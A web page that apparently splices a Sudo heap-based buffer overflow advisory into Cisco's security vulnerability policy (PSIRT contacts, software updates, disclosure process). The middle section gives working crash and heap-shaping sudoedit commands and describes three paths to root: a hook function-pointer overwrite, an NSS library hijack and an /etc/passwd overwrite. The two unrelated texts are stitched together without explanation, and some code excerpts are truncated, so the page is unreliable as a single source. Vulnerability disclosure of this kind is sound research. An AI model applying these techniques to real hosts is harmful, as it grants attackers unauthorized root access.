All customers, regardless of contract status, are eligible to receive support from the Cisco TAC for a known or reasonably suspected security vulnerability in Cisco products and services. For more information about how to contact the Cisco TAC, see the [General Security-Related Queries](https://sec.cloudapps.cisco.com/security/center/resources/security_vulnerability_policy.html#gsrq) section of this document. Customers who contact the Cisco TAC should reference the URL of the Cisco security publication to assist in connecting with the proper support team.

Customers with paid service contracts for incident response and forensic assistance should request assistance through the contact methods specified in their contract.

Cisco, at its sole discretion, may offer customers additional security services free of charge. Cisco reserves the right to determine the type and degree of free assistance it may offer in connection with any incident and to withdraw from such an incident at any time.

### **Security Software Updates**

The Cisco PSIRT will investigate and disclose vulnerabilities in Cisco products and services from the date of First Commercial Shipment (FCS) to the [LDoS](https://www.cisco.com/c/en/us/products/eos-eol-policy.html). Cisco customers with service contracts that entitle them to regular software updates should obtain security fixes through their usual update channels, generally from the Cisco website for the relevant product. Cisco recommends contacting the Cisco TAC only with specific and imminent problems or questions.

As a special customer service, and to improve the overall security of the internet, Cisco may offer customers free software updates to address high-severity security problems. The decision to provide free software updates is made on a case-by-case basis. Refer to the Cisco security publication for details. Free software updates will typically be limited to Critical- and High-severity vulnerabilities.

Fixes for some third-party software vulnerabilities may be available only in the most recent major software releases and not backported to older releases.

If Cisco has offered a free software update to address a specific issue, noncontract customers who are eligible for the update may obtain it by contacting the Cisco TAC using any of the methods described in the [General Security-Related Queries](#gsrq) section of this document.

**Note:** To verify their entitlement, individuals who contact the Cisco TAC should have available the URL of the Cisco document that is offering the update.

Customers may only download, install, and expect support for software releases and feature sets for which they have purchased a valid license that is current and active. By installing, downloading, accessing, or otherwise using such software updates, customers agree to follow the terms of the [Cisco software license agreement](https://www.cisco.com/c/en/us/about/legal/cloud-and-software/end_user_license_agreement.html). In most cases, the software update will be a maintenance release to software that was previously purchased. Free security software updates do not entitle customers to a new software license, additional software feature sets, or major revision upgrades.

After [End of Sale](https://www.cisco.com/c/en/us/products/eos-eol-policy.html) (EoS), the availability of security fixes for vulnerabilities is defined in the product’s EoS bulletin. (See the [End-of-Life Policy](https://www.cisco.com/c/en/us/products/eos-eol-policy.html) for details.) The EoS bulletin may define the Last Day of Support (**LDoS**) milestone, which identifies the last date that Cisco will investigate and disclose product vulnerabilities.

Once the LDoS has been reached, the Cisco PSIRT will continue to accept vulnerability reports but will not analyze, fix, or disclose potential vulnerabilities. To this end, the Cisco PSIRT will not issue CVEs for issues reported on products that are past the LDoS milestone.

### Security Advisory Terms and Conventions

**Fixed Release Availability:** If a future release date is indicated for software, the date provided represents an estimate based on all information known to Cisco as of the "Last Updated" date at the top of the advisory. Availability dates are subject to change based on a number of factors, including satisfactory testing results and delivery of other priority features and fixes. If no version or date is listed for an affected component (indicated by a blank field and/or an advisory designation of Interim), Cisco is continuing to evaluate the fix and will update the advisory as additional information becomes available. After the advisory is marked Final, customers should refer to the associated Cisco bug(s) for further details.

The designated Security Advisory status indicates the following:

**Interim:** The Cisco investigation is ongoing. Cisco will issue revisions to the advisory when additional information, including fixed software release data, becomes available.

**Final:** Cisco has completed its evaluation of the vulnerability described in the advisory. There will be no further updates unless there is a material change in the nature of the vulnerability.

All aspects of this process are subject to change without notice and on a case-by-case basis. No particular level of response is guaranteed for any specific issue or class of issues.

Summary
========================================================================

We discovered a heap-based buffer overflow in Sudo
(<https://www.sudo.ws/>). This vulnerability:

- is exploitable by any local user (normal users and system users,
  sudoers and non-sudoers), without authentication (i.e., the attacker
  does not need to know the user's password);

- was introduced in July 2011 (commit 8255ed69), and affects all legacy
  versions from 1.8.2 to 1.8.31p2 and all stable versions from 1.9.0 to
  1.9.5p1, in their default configuration.

We developed three different exploits for this vulnerability, and
obtained full root privileges on Ubuntu 20.04 (Sudo 1.8.31), Debian 10
(Sudo 1.8.27), and Fedora 33 (Sudo 1.9.2). Other operating systems and
distributions are probably also exploitable.

========================================================================
Analysis
========================================================================

If Sudo is executed to run a command in "shell" mode (shell -c command):

- either through the -s option, which sets Sudo's MODE_SHELL flag;

- or through the -i option, which sets Sudo's MODE_SHELL and
  MODE_LOGIN_SHELL flags;

then, at the beginning of Sudo's main(), parse_args() rewrites argv
(lines 609-617), by concatenating all command-line arguments (lines
587-595) and by escaping all meta-characters with backslashes (lines
590-591):

------------------------------------------------------------------------
571     if (ISSET(mode, MODE_RUN) && ISSET(flags, MODE_SHELL)) {
572         char **av, *cmnd = NULL;
573         int ac = 1;
...
581             cmnd = dst = reallocarray(NULL, cmnd_size, 2);
...
587             for (av = argv; *av != NULL; av++) {
588                 for (src = *av; *src != '\0'; src++) {
589                     /* quote potential meta characters */
590                     if (!isalnum((unsigned char)*src) && *src != '_' && *src != '-' && *src != '$')
591                         *dst++ = '\\';
592                     *dst++ = *src;
593                 }
594                 *dst++ = ' ';
595             }
...
600             ac += 2; /* -c cmnd */
...
603         av = reallocarray(NULL, ac + 1, sizeof(char *));
...
609         av[0] = (char *)user_details.shell; /* plugin may override shell */
610         if (cmnd != NULL) {
611             av[1] = "-c";
612             av[2] = cmnd;
613         }
614         av[ac] = NULL;
615
616         argv = av;
617         argc = ac;
618     }
------------------------------------------------------------------------

Later, in sudoers_policy_main(), set_cmnd() concatenates the
command-line arguments into a heap-based buffer "user_args" (lines
864-871) and unescapes the meta-characters (lines 866-867), "for sudoers
matching and logging purposes":

------------------------------------------------------------------------
 819     if (sudo_mode & (MODE_RUN | MODE_EDIT | MODE_CHECK)) {
 ...
 852             for (size = 0, av = NewArgv + 1; *av; av++)
 853                 size += strlen(*av) + 1;
 854             if (size == 0 || (user_args = malloc(size)) == NULL) {
 ...
 857             }
 858             if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) {
 ...
 864                 for (to = user_args, av = NewArgv + 1; (from = *av); av++) {
 865                     while (*from) {
 866                         if (from[0] == '\\' && !isspace((unsigned char)from[1]))
 867                             from++;
 868                         *to++ = *from++;
 869                     }
 870                     *to++ = ' ';
 871                 }
 ...
 884             }
 ...
 886     }
------------------------------------------------------------------------

Unfortunately, if a command-line argument ends with a single backslash
character, then:

- at line 866, "from[0]" is the backslash character, and "from[1]" is
  the argument's null terminator (i.e., not a space character);

- at line 867, "from" is incremented and points to the null terminator;

- at line 868, the null terminator is copied to the "user_args" buffer,
  and "from" is incremented again and points to the first character
  after the null terminator (i.e., out of the argument's bounds);

- the "while" loop at lines 865-869 reads and copies out-of-bounds
  characters to the "user_args" buffer.

In other words, set_cmnd() is vulnerable to a heap-based buffer
overflow, because the out-of-bounds characters that are copied to the
"user_args" buffer were not included in its size (calculated at lines
852-853).

In theory, however, no command-line argument can end with a single
backslash character: if MODE_SHELL or MODE_LOGIN_SHELL is set (line 858,
a necessary condition for reaching the vulnerable code), then MODE_SHELL
is set (line 571) and parse_args() already escaped all meta-characters,
including backslashes (i.e., it escaped every single backslash with a
second backslash).

In practice, however, the vulnerable code in set_cmnd() and the escape
code in parse_args() are surrounded by slightly different conditions:

------------------------------------------------------------------------
 819     if (sudo_mode & (MODE_RUN | MODE_EDIT | MODE_CHECK)) {
 ...
 858             if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) {
------------------------------------------------------------------------

versus:

------------------------------------------------------------------------
571     if (ISSET(mode, MODE_RUN) && ISSET(flags, MODE_SHELL)) {
------------------------------------------------------------------------

Our question, then, is: can we set MODE_SHELL and either MODE_EDIT or
MODE_CHECK (to reach the vulnerable code) but not the default MODE_RUN
(to avoid the escape code)?

The answer, it seems, is no: if we set MODE_EDIT (-e option, line 361)
or MODE_CHECK (-l option, lines 423 and 519), then parse_args() removes
MODE_SHELL from the "valid_flags" (lines 363 and 424) and exits with an
error if we specify an invalid flag such as MODE_SHELL (lines 532-533):

------------------------------------------------------------------------
358                 case 'e':
...
361                     mode = MODE_EDIT;
362                     sudo_settings[ARG_SUDOEDIT].value = "true";
363                     valid_flags = MODE_NONINTERACTIVE;
364                     break;
...
416                 case 'l':
...
423                     mode = MODE_LIST;
424                     valid_flags = MODE_NONINTERACTIVE|MODE_LONG_LIST;
425                     break;
...
518     if (argc > 0 && mode == MODE_LIST)
519         mode = MODE_CHECK;
...
532     if ((flags & valid_flags) != flags)
533         usage(1);
------------------------------------------------------------------------

But we found a loophole: if we execute Sudo as "sudoedit" instead of
"sudo", then parse_args() automatically sets MODE_EDIT (line 270) but
does not reset "valid_flags", and the "valid_flags" include MODE_SHELL
by default (lines 127 and 249):

------------------------------------------------------------------------
127 #define DEFAULT_VALID_FLAGS     (MODE_BACKGROUND|MODE_PRESERVE_ENV|MODE_RESET_HOME|MODE_LOGIN_SHELL|MODE_NONINTERACTIVE|MODE_SHELL)
...
249     int valid_flags = DEFAULT_VALID_FLAGS;
...
267     proglen = strlen(progname);
268     if (proglen > 4 && strcmp(progname + proglen - 4, "edit") == 0) {
269         progname = "sudoedit";
270         mode = MODE_EDIT;
271         sudo_settings[ARG_SUDOEDIT].value = "true";
272     }
------------------------------------------------------------------------

Consequently, if we execute "sudoedit -s", then we set both MODE_EDIT
and MODE_SHELL (but not MODE_RUN), we avoid the escape code, reach the
vulnerable code, and overflow the heap-based buffer "user_args" through
a command-line argument that ends with a single backslash character:

------------------------------------------------------------------------
sudoedit -s '\' `perl -e 'print "A" x 65536'`
malloc(): corrupted top size
Aborted (core dumped)
------------------------------------------------------------------------

From an attacker's point of view, this buffer overflow is ideal:

- we control the size of the "user_args" buffer that we overflow (the
  size of our concatenated command-line arguments, at lines 852-854);

- we independently control the size and contents of the overflow itself
  (our last command-line argument is conveniently followed by our first
  environment variables, which are not included in the size calculation
  at lines 852-853);

- we can even write null bytes to the buffer that we overflow (every
  command-line argument or environment variable that ends with a single
  backslash writes a null byte to "user_args", at lines 866-868).

For example, on an amd64 Linux, the following command allocates a
24-byte "user_args" buffer (a 32-byte heap chunk) and overwrites the
next chunk's size field with "A=a\0B=b\0" (0x00623d4200613d41), its fd
field with "C=c\0D=d\0" (0x00643d4400633d43), and its bk field with
"E=e\0F=f\0" (0x00663d4600653d45):

------------------------------------------------------------------------
env -i 'AA=a\' 'B=b\' 'C=c\' 'D=d\' 'E=e\' 'F=f' sudoedit -s '1234567890123456789012\'
------------------------------------------------------------------------

--|--------+--------+--------+--------|--------+--------+--------+--------+--
  |        |        |12345678|90123456|789012.A|A=a.B=b.|C=c.D=d.|E=e.F=f.|
--|--------+--------+--------+--------|--------+--------+--------+--------+--
              size  <---- user_args buffer ---->  size      fd       bk

========================================================================
Exploitation
========================================================================

Because Sudo calls localization functions at the very beginning of its
main() function:

------------------------------------------------------------------------
 154     setlocale(LC_ALL, "");
 155     bindtextdomain(PACKAGE_NAME, LOCALEDIR);
 156     textdomain(PACKAGE_NAME);
------------------------------------------------------------------------

and passes translation strings (through the gettext() function and _()
macro) to format-string functions such as:

------------------------------------------------------------------------
 301             sudo_printf(SUDO_CONV_ERROR_MSG, _("%s is not in the sudoers "
 302                 "file.  This incident will be reported.\n"), user_name);
------------------------------------------------------------------------

we initially wanted to reuse halfdog's fascinating technique from
<https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/> and
transform Sudo's heap-based buffer overflow into a format-string
exploit. More precisely:

- at line 154, in setlocale(), we malloc()ate and free() several LC
  environment variables (LC_CTYPE, LC_MESSAGES, LC_TIME, etc), thereby
  creating small holes at the very beginning of Sudo's heap (free fast
  or tcache chunks);

- at line 155, bindtextdomain() malloc()ates a struct binding, which
  contains a dirname pointer to the name of a directory that contains
  ".mo" catalog files and hence translation strings;

- in set_cmnd(), we malloc()ate the "user_args" buffer into one of the
  holes at the beginning of Sudo's heap, and overflow this buffer, thus
  overwriting the struct binding's dirname pointer;

- at line 301 (for example), gettext() (through the _() macro) loads our
  own translation string from the overwritten dirname -- in other words,
  we control the format string that is passed to sudo_printf().

To implement this initial technique, we wrote a rudimentary brute-forcer
that executes Sudo inside gdb, overflows the "user_args" buffer, and
randomly selects the following parameters:

- the LC environment variables that we pass to Sudo, and their length
  (we use the "C.UTF-8" locale and append a random "@modifier");

- the size of the "user_args" buffer that we overflow;

- the size of the overflow itself;

- whether we go through Sudo's authentication code (-A or -n option) or
  not (-u #realuid option).

Unfortunately, this initial technique failed; our brute-forcer was able
to overwrite the struct binding's dirname pointer:

------------------------------------------------------------------------
Program received signal SIGSEGV, Segmentation fault.

0x00007f6e0dde1ea9 in __dcigettext (domainname=domainname@...ry=0x7f6e0d9cc020 "sudoers", msgid1=msgid1@...ry=0x7f6e0d9cc014 "user NOT in sudoers", msgid2=msgid2@...ry=0x0, plural=plural@...ry=0, n=n@...ry=0, category=5) at dcigettext.c:619

rax            0x4141414141414141  4702111234474983745
------------------------------------------------------------------------

but LC_MESSAGES was always the default "C" locale (not "C.UTF-8"), which
disables the string translation in gettext() (i.e., gettext() returns
the original format string, not our own).

Fortunately, however, our brute-forcer produced dozens of unique Sudo
crashes and gdb backtraces; among these, three caught our attention, and
we eventually exploited all three.

========================================================================
1/ struct sudo_hook_entry overwrite
========================================================================

The first crash that caught our attention is:

------------------------------------------------------------------------
Program received signal SIGSEGV, Segmentation fault.

0x000056291a25d502 in process_hooks_getenv (name=name@...ry=0x7f4a6d7dc046 "SYSTEMD_BYPASS_USERDB", value=value@...ry=0x7ffc595cc240) at ../../src/hooks.c:108

=> 0x56291a25d502 <process_hooks_getenv+82>:    callq  *0x8(%rbx)

rbx            0x56291c1df2b0      94734565372592

0x56291c1df2b0: 0x4141414141414141      0x4141414141414141
------------------------------------------------------------------------

Incredibly, Sudo's function process_hooks_getenv() crashed (at line 108)
because we directly overwrote a function pointer, getenv_fn (a member of
a heap-based struct sudo_hook_entry):

------------------------------------------------------------------------
 99 int
100 process_hooks_getenv(const char *name, char **value)
101 {
102     struct sudo_hook_entry *hook;
103     char *val = NULL;
...
107     SLIST_FOREACH(hook, &sudo_hook_getenv_list, entries) {
108         rc = hook->u.getenv_fn(name, &val, hook->closure);
------------------------------------------------------------------------

To exploit this struct sudo_hook_entry overwrite, we note that:

- the call to getenv_fn (at line 108) is compatible with a call to
  execve():

  . name ("SYSTEMD_BYPASS_USERDB") is compatible with execve()'s
    pathname argument;

  . &val (a pointer to a NULL pointer) is compatible with execve()'s
    argv;

  . hook->closure (a NULL pointer) is compatible with execve()'s envp;

- we can defeat ASLR by partially overwriting the function pointer
  getenv_fn (which points to the function sudoers_hook_getenv() in the
  shared library sudoers.so); and luckily, the beginning of sudoers.so
  contains a call to execve() (or execv()):

------------------------------------------------------------------------
0000000000008a00 <execv@plt>:
    8a00:       f3 0f 1e fa             endbr64
    8a04:       f2 ff 25 65 55 05 00    bnd jmpq *0x55565(%rip)        # 5df70 <execv@...BC_2.2.5>
    8a0b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)
------------------------------------------------------------------------

- we can read /dev/kmsg (dmesg) as an unprivileged user on Ubuntu, and
  therefore obtain detailed information about our Sudo crashes.

Consequently, we adopt the following strategy:

- First, we brute-force the exploit parameters until we overwrite
  getenv_fn with an invalid userland address (above 0x800000000000) --
  until we observe a general protection fault at getenv_fn's call site:

------------------------------------------------------------------------
sudoedit[15904] general protection fault ip:55e9b645b502 sp:7ffe53d6fa40 error:0 in sudo[55e9b644e000+1a000]
                                                     ^^^
------------------------------------------------------------------------

- Next, we reuse these exploit parameters but overwrite getenv_fn with a
  regular pattern of valid (below 0x800000000000) but unmapped userland
  addresses -- in this example, getenv_fn is the 22nd pointer that we
  overwrite (0x32 is '2', a part of our pattern):

------------------------------------------------------------------------
sudoedit[15906]: segfault at 323230303030 ip 0000323230303030 sp 00007ffeeabf2868 error 14 in sudo[55b036c16000+5000]
                             ^^^^
------------------------------------------------------------------------

- Last, we partially overwrite getenv_fn (we overwrite its two least
  significant bytes with 0x8a00, execv()'s offset in sudoers.so, and its
  third byte with 0x00, user_args's null terminator in set_cmnd()) until
  we defeat ASLR -- we have a good chance of overwriting getenv_fn with
  the address of execv() after 2^(3*8-12) = 2^12 = 4096 tries, thus
  executing our own binary, named "SYSTEMD_BYPASS_USERDB", as root.

We successfully tested this first exploit on Ubuntu 20.04.

========================================================================
2/ struct service_user overwrite
========================================================================

The second crash that caught our attention is:

------------------------------------------------------------------------
Program received signal SIGSEGV, Segmentation fault.

0x00007f6bf9c294ee in nss_load_library (ni=ni@...ry=0x55cf1a1dd040) at nsswitch.c:344

rbx            0x41414141414141    18367622009667905
------------------------------------------------------------------------

The glibc's function nss_load_library() crashed (at line 344) because we
overwrote the pointer "library", a member of a heap-based struct
service_user:

------------------------------------------------------------------------
327 static int

329 {
330   if (ni->library == NULL)

359       ni->library->lib_handle = __libc_dlopen (shlib_name);
------------------------------------------------------------------------

We can easily transform this struct service_user overwrite into an
arbitrary code execution:

- we overwrite ni->library with a NULL pointer, to enter the block at
  lines 330-342, avoid the crash at line 344, and enter the block at
  lines 344-359;

- we overwrite ni->name (an array of characters, initially "systemd")
  with "X/X";

- lines 353-357 construct the name of a shared library "libnss_X/X.so.2"
  (instead of "libnss_systemd.so.2");

- at line 359, we load our own shared library "libnss_X/X.so.2" from the
  current working directory and execute our _init() constructor as root.

We successfully tested this second exploit on Ubuntu 20.04, Debian 10,
and Fedora 33.

========================================================================
3/ def_timestampdir overwrite
========================================================================

Our third exploit is not derived from one of Sudo's crashes, but from a
casual observation: during our brute-force, Sudo created dozens of new
directories in our current working directory (AAAAAA, AAAAAAAAA, etc).
Each of these directories belongs to root and contains only one small
file, named after our own user: Sudo's timestamp file -- we evidently
overwrote def_timestampdir, the name of Sudo's timestamp directory.

If we overwrite def_timestampdir with the name of a directory that does
not already exist, then we can race against Sudo's ts_mkdirs(), create a
symlink to an arbitrary file, and:

3a/ either chown() this arbitrary file to user root and group root;

3b/ or open (or create) this arbitrary file as root, and write a struct
timestamp_entry to it.

We were unable to transform 3a/ into full root privileges (for example,
if we chown() our own SUID binary to root, then the kernel automatically
removes our binary's SUID bit). If you, dear reader, find a solution to
this problem, please post it to the public oss-security mailing list!

Eventually, we were able to transform 3b/ into full root privileges, but
we initially faced two problems:

- Sudo's timestamp_open() deletes our arbitrary symlink if the file it
  points to is older than boot time. We were able to solve this first
  problem by creating a very old timestamp file (from the Unix epoch),
  by waiting until timestamp_open() deletes it, and by racing against
  timestamp_open() to create our final, arbitrary symlink.

- We do not control the contents of the struct timestamp_entry that is
  written to the arbitrary file. To the best of our knowledge, we only
  control three bytes (a process ID or a struct timespec), and we were
  unable to transform this three-byte write into full root privileges.
  If you, dear reader, find a solution to this problem, please post it
  to the public oss-security mailing list!

However, we were able to circumvent this second problem by abusing a
minor bug in Sudo's timestamp_lock(). If we win the two races against
ts_mkdirs() and timestamp_open(), and if our arbitrary symlink points to
/etc/passwd, then this file is opened as root, and:

------------------------------------------------------------------------
 65 struct timestamp_entry {
 66     unsigned short version;     /* version number */
 67     unsigned short size;        /* entry size */
 68     unsigned short type;        /* TS_GLOBAL, TS_TTY, TS_PPID */
 ..
 78 };
------------------------------------------------------------------------
 305 static ssize_t
 306 ts_write(int fd, const char *fname, struct timestamp_entry *entry, off_t offset)
 307 {
 ...
 318         nwritten = pwrite(fd, entry, entry->size, offset);
 ...
 350 }
------------------------------------------------------------------------
 619 bool
 620 timestamp_lock(void *vcookie, struct passwd *pw)
 621 {
 622     struct ts_cookie *cookie = vcookie;
 623     struct timestamp_entry entry;
 ...
 644     nread = read(cookie->fd, &entry, sizeof(entry));
 645     if (nread == 0) {
 ...
 652     } else if (entry.type != TS_LOCKEXCL) {
 ...
 657         if (ts_write(cookie->fd, cookie->fname, &entry, 0) == -1)
------------------------------------------------------------------------

- at line 644, the first 0x38 bytes of /etc/passwd ("root:x:0:0:...")
  are read into a stack-based struct timestamp_entry, entry;

- at line 652, entry.type is 0x783a (":x"), not TS_LOCKEXCL;

- at lines 657 and 318, entry->size bytes from the stack-based entry are
  written to /etc/passwd, but entry->size is actually 0x746f ("ot"), not
  sizeof(struct timestamp_entry).

As a result, we write the entire contents of Sudo's stack to /etc/passwd
(including our command-line arguments and our environment variables): we
inject an arbitrary user into /etc/passwd and therefore obtain full root
privileges. We successfully tested this third exploit on Ubuntu 20.04.

Note: this minor bug in timestamp_lock() was fixed in January 2020 by
commit 586b418a, but this fix was not backported to legacy versions.

## Purpose

This policy was created to guide and inform Cisco customers in the event of a reported vulnerability in a Cisco product or cloud-hosted service. It ensures that Cisco customers have a consistent, unambiguous resource to help them understand how Cisco responds to events of this nature.

## Policy

This policy clearly states how Cisco addresses reported security vulnerabilities in Cisco products and cloud-hosted services, including the timeline, actions, and responsibilities that apply to all customers.

## Cisco Product Security Incident Response

The Cisco Product Security Incident Response Team (PSIRT) is responsible for responding to Cisco product security incidents. The Cisco PSIRT is a dedicated, global team that manages the receipt, investigation, and public reporting of information about security vulnerabilities and issues related to Cisco products and services. Cisco defines a security vulnerability as a weakness in the computational logic (e.g., code) found in software and hardware components that, when exploited, results in a negative impact to confidentiality, integrity, or availability. Cisco reserves the right to deviate from this definition based on specific circumstances. The Cisco PSIRT adheres to ISO/IEC 29147:2018, which are [guidelines for disclosure of potential vulnerabilities](https://www.iso.org/standard/72311.html) established by the International Organization for Standardization.

The on-call Cisco PSIRT works 24 hours a day with Cisco customers, independent security researchers, consultants, industry organizations, and other vendors to identify possible security vulnerabilities and issues with Cisco products and networks.

## Reporting or Obtaining Support for a Suspected Security Vulnerability

Individuals or organizations that are experiencing a product security issue are strongly encouraged to contact the Cisco PSIRT. Cisco welcomes reports from independent researchers, industry organizations, vendors, customers, and other sources concerned with product or network security. At minimum, a description of the potential vulnerability is needed to report a security issue.

To contact the Cisco PSIRT, use one of the following methods:

*Primary approach:* The most effective method for reaching the Cisco PSIRT is sending an email to psirt@cisco.com. In the email, provide a detailed problem description and any relevant details and logs.

Alternatively, the Cisco PSIRT may be contacted using the following phone numbers:

* +1 877 228 7302 (toll-free within North America)
* +1 408 525 6532 (international direct dial)

These contact numbers route to Cisco global customer support. To facilitate engagement, please explain that this is a product security issue or, alternatively, reference the PSIRT-SVP-001 search code.

Cisco encourages customers to encrypt sensitive information that is sent to Cisco by email. The Cisco PSIRT supports encrypted messages via Pretty Good Privacy (PGP)/GNU Privacy Guard (GPG) encryption software. The Cisco PSIRT public key is available at the following link: <https://cscrdr.cloudapps.cisco.com/cscrdr/security/center/files/Cisco_PSIRT_PGP_Public_Key.asc>.

**Note:** Cisco supports an RFC 9116-compliant security.txt file, located at <https://www.cisco.com/.well-known/security.txt>.

## General Security-Related Queries

For general security concerns about Cisco products and cloud-hosted services, the Cisco Technical Assistance Center (TAC) can provide configuration and technical assistance. The Cisco TAC can also help with nonsensitive security incidents and software upgrades for security bug fixes. To contact the Cisco TAC, use one of the following methods:

|  | **Cisco TAC Support** |
| --- | --- |
| **Phone** | +1 800 553 2447 (toll-free within North America)+1 408 526 7209 (international direct dial) Additional TAC numbers: [Customer Service Contacts](https://www.cisco.com/c/en/us/support/web/tsd-cisco-worldwide-contacts.html) |
| **Web** | <https://mycase.cloudapps.cisco.com/start> |
| **Hours** | 24 hours a day, 7 days a week |

## Receiving Security Vulnerability Information from Cisco

There are several ways to stay connected and receive the latest security vulnerability information from Cisco. Customers should review the following table, and subsequent summaries, to determine the appropriate option for them:

| **Cisco.com** | <https://www.cisco.com/security/> |
| --- | --- |
| **Email** | cust-security-announce@cisco.com |
| **RSS** | <https://sec.cloudapps.cisco.com/security/center/rss.x?i=44> |
| **Cisco PSIRT openVuln API** | [https://developer.cisco.com/site/PSIRT/](https://developer.cisco.com/site/PSIRT) |
| **My Notifications** | <https://www.cisco.com/c/en/us/support/web/tools/cns/notifications.html> |

### **Cisco.com**

The [Cisco Security portal](https://www.cisco.com/security) on Cisco.com provides Cisco security vulnerability documents and Cisco security information, including relevant security products and services.

For direct links to specific security functions, see the [Types of Security Publications](#tosp) section of this
document.

### **Email**

Cisco Security Advisories provide information about Critical-, High-, and Medium-severity security vulnerabilities. They are clear signed with the Cisco PSIRT [PGP public key](https://cscrdr.cloudapps.cisco.com/cscrdr/security/center/files/Cisco_PSIRT_PGP_Public_Key.asc) and distributed to the external cust-security-announce@cisco.com mailing list. The Cisco PSIRT may also send Informational advisories to the cust-security-announce mailing list. Informational advisories are used not as a disclosure mechanism for any Cisco vulnerabilities but for sharing information on security incidents that may impact Cisco products and that may be of interest to Cisco customers.

Emails are sent for the initial release of and major revisions to Cisco Security Advisories. A major revision is defined as a significant change to advisory content that could result in the customer addressing the vulnerability differently. Examples of a major advisory change include, but are not limited to, changes to the affected products list, changes in Security Impact Rating (SIR; see the [Assessing Security Risk—Common Vulnerability Scoring System and the Security Impact Rating](#asr) section of this document), and changes in mitigation and/or fix information. If a document undergoes a minor revision, the update will be posted to Cisco.com without an accompanying email. Customers that require automated alerts for minor revisions should subscribe to the Cisco Security Advisory Really Simple Syndication (RSS) feed or My Notifications. All Security Advisories on Cisco.com are displayed in chronological order, with the most recent advisories and updates appearing at the top of the page.

To subscribe to the cust-security-announce mailing list, email cust-security-announce-join@cisco.com. (The content of the message does not matter.) You will receive confirmation, instructions, and a list policy statement.

Please note that requests must be sent to cust-security-announce-join@cisco.com and not to the cust-security-announce@cisco.com list itself.

To unsubscribe from the cust-security-announce mailing list, email cust-security-announce-leave@cisco.com with the word "unsubscribe" in the subject line. (The content of the message does not matter.) You will receive a confirmation notice, to which you need to reply to be unsubscribed. You will not be unsubscribed unless you reply to the confirmation email.

Please note that requests to subscribe must be sent to cust-security-announce-join@cisco.com, and requests to unsubscribe must be sent to cust-security-announce-leave@cisco.com—not to the cust-security-announce@cisco.com email address itself.

You must send the messages from the account that you want to be subscribed to or unsubscribed from the list.

Customers can also request to be subscribed or unsubscribed to the cust-security-announce mailing list by emailing psirt@cisco.com.

### **RSS Feeds**

Cisco security vulnerability information is also available via RSS feeds from Cisco.com. These feeds are free and do not require an active Cisco.com registration. For information on how to subscribe to the RSS feeds, visit the [Cisco Security RSS Feeds page](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44).

### **Cisco PSIRT openVuln API**

The Cisco PSIRT openVuln application programming interface (API) is a RESTful API that conforms to the [representational state transfer](https://restfulapi.net/) (REST) software architectural style and allows customers to obtain Cisco security vulnerability information in different machine-consumable formats. To learn about accessing and using the API, visit the [PSIRT page](https://developer.cisco.com/site/PSIRT) on the Cisco DevNet website.

### **My Notifications**

The [My Notifications website](https://www.cisco.com/c/en/us/support/web/tools/cns/notifications.html) allows registered Cisco.com users to subscribe to and receive important Cisco product and technology information, including Cisco Security Advisories. This service provides an improved unified subscription experience, allowing users to choose the timing of notifications as well as the notification delivery method (email or RSS feed). The level of access will be determined by the subscriber's relationship with Cisco.

### Creating a Notification

To create a notification, use the following steps:

1. Log in to the [My Notifications website](https://www.cisco.com/c/en/us/support/web/tools/cns/notifications.html) on Cisco.com using a registered Cisco.com account name and password.
2. Click the **Add Notification** button and follow the instructions.

## Public Relations or Press Queries Regarding Cisco Security Vulnerability Information

The following table shows the Cisco press contacts for Cisco security vulnerability information.

|  | **Press Contacts** |

| **Michael Ricketts** | Email: micricke@cisco.comPhone: +1 919 392 2756 |
| **Additional Public Relations** | media\_pr@cisco.com |

## Commitment to Product Security and Integrity at Cisco

Cisco product development practices specifically prohibit any intentional behaviors or product features that are designed to allow unauthorized device or network access, exposure of sensitive device information, or a bypass of security features or restrictions. These include, but are not limited to:

* Undisclosed device access methods or "back doors"
* Hardcoded or undocumented account credentials
* Covert communication channels
* Undocumented traffic diversion

Cisco considers such product behaviors to be serious vulnerabilities. Cisco will address any issues of this nature with the highest priority and encourages all parties to report suspected vulnerabilities to the Cisco PSIRT for immediate investigation. Internal and external reports of these vulnerabilities will be managed and disclosed in accordance with the terms of the Cisco Security Vulnerability Policy.

More information can be found on the [Cisco Secure Development Lifecycle (CSDL) website](https://www.cisco.com/c/en/us/about/trust-center/technology-built-in-security.html#~stickynav=2).

## Cisco Product Security Incident Response Process

Figure 1 illustrates the vulnerability life cycle and the Cisco PSIRT disclosure and resolution process at a high level.

**Figure 1.** Cisco Product Security Incident Response Process

![response process cycle from awareness to feedback](https://cscrdr.cloudapps.cisco.com/cscrdr/security/center/public/files/images/white_papers/psirtprocess.jpg "Cisco Product Security Incident Response Process")

The steps in the process illustrated in Figure 1 are as follows:

1. **Awareness:** PSIRT receives notification of a security incident.
2. **Active Management:** PSIRT prioritizes and identifies resources.
3. **Software Fixes:** PSIRT coordinates the fix and impact assessment.
4. **Customer Notification:** PSIRT notifies all customers simultaneously.

The Cisco PSIRT investigates all reports regardless of the Cisco software code version or product life cycle status until the product reaches the [Last Day of Support](https://www.cisco.com/c/en/us/products/eos-eol-policy.html) (LDoS). Issues will be prioritized based on the potential severity of the vulnerability and other environmental factors. Ultimately, the resolution of a reported incident may require upgrades to products and cloud-hosted services that are under active support from Cisco. As a best practice, Cisco strongly recommends that customers periodically verify that their products are under active support for access to the latest software updates and other benefits.

Throughout the investigative process, the Cisco PSIRT strives to work collaboratively with the source of the report (incident reporter) to confirm the nature of the vulnerability, gather required technical information, and ascertain appropriate remedial action. When the initial investigation is complete, results will be delivered to the incident reporter along with a plan for resolution and public disclosure. If the incident reporter disagrees with the conclusion, the Cisco PSIRT will make every effort to address those concerns.

In the case of incidents about which an agreement cannot be reached through the normal process, incident reporters may escalate by contacting the [Cisco TAC](#gsrq) and requesting the director of the global Cisco PSIRT team.

During any investigation, the Cisco PSIRT manages all sensitive information on a highly confidential basis. Internal distribution is limited to those individuals who have a legitimate need to know and can actively assist in the resolution. Similarly, the Cisco PSIRT asks incident reporters to maintain strict confidentiality until complete resolutions are available for customers and have been published by the Cisco PSIRT on the Cisco website through the appropriate coordinated disclosure.

With the agreement of the incident reporter, the Cisco PSIRT may acknowledge the reporter's contribution during the public disclosure of the vulnerability.

